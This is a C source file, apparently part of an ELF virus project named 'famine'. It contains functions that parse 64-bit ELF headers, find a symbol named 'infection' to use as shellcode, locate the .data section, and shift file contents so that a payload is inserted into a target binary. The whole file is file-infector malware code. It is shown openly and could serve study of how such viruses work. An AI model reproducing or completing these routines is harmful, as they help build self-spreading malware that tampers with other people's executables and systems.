#include "famine.h"
#define PAYLOAD_NAME "infection"

shellcode   getSymbol(Elf64_Ehdr *header) {
  Elf64_Sym   *sym;
  size_t      size;
  char        *strTab;
  Elf64_Shdr  *section;
  shellcode   payload;
  
  section = (void *)header + header->e_shoff;
  while (section->sh_type != SHT_STRTAB)
    section += 1;
  strTab = (void *)header + section->sh_offset;
  section = (void *)header + header->e_shoff;
  while (section->sh_type != SHT_SYMTAB)
    section += 1;
  size = 0;
  sym = (void *)header + section->sh_offset;
  while (size < section->sh_size) {
    if (strcmp(strTab + sym->st_name, PAYLOAD_NAME) == 0)
      break ;
    sym += 1;
    size += sizeof(Elf64_Sym);
  }
  if (size == section->sh_size)
    return NULL;
  // TODO Free return value
  payload = (void *)header + sizeof(Elf64_Ehdr) + sym->st_value;
  return payload;
}

int         appendSignature(struct bfile file, size_t offset) {
  size_t  i;
  void    *tmp;
  size_t  toAdd;
  size_t  total;

  i = file.size - 1;
  tmp = file.header;
  toAdd = strlen(payload) + 1;
  total = file.size - offset;
  memmove(tmp + i + toAdd - total, tmp + i - total, total);
  i -= total - 1;
  memcpy(tmp + i, payload, toAdd);
  return (0);
}

Elf64_Shdr *getDataSectionHeader(Elf64_Ehdr *header) {
  Elf64_Shdr  *pointer;
  Elf64_Shdr  *shstrHeader;

  pointer = ((void *)header) + header->e_shoff;
  shstrHeader = ((void *)header) + header->e_shoff + sizeof(Elf64_Shdr) * header->e_shstrndx;
  dprintf(1, "shstrheader: %p\n", shstrHeader);
  while (strcmp(((void *)header) + shstrHeader->sh_offset + pointer->sh_name, ".data") != 0)
    pointer += 1;
  return (pointer);
}

